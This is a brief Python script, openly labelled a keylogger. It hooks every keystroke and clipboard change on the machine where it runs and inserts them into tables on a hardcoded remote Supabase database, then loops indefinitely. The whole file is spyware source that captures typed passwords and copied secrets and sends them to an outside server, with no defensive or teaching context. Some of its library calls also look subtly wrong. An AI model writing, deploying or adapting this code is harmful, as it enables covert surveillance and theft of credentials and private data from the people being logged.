import os
import time
import keyboard
import clipboard
from supabase import create_client, Client

# Initialize Supabase client
supabase: Client = create_client(
    "https://efjanywnqbtbdnxlspga.supabase.co",  # Your Supabase URL
    "sb_publishable_E0cGB_SOoW2EZj4JGlTF7A_b2zxZaOi"  # Your Publishable Key
)

# Function to log key presses
def log_key(key):
    supabase.from_("keylogs").insert([
        {"key": key, "timestamp": time.time()}
    ]).execute()

# Function to log clipboard content
def log_clipboard(text):
    supabase.from_("clipboard_logs").insert([
        {"text": text, "timestamp": time.time()}
    ]).execute()

# Start listening for key presses
keyboard.hook(log_key)

# Start listening for clipboard changes
clipboard.listen(log_clipboard)

# Keep the script running
print("Keylogger is running...")
while True:
    time.sleep(1)
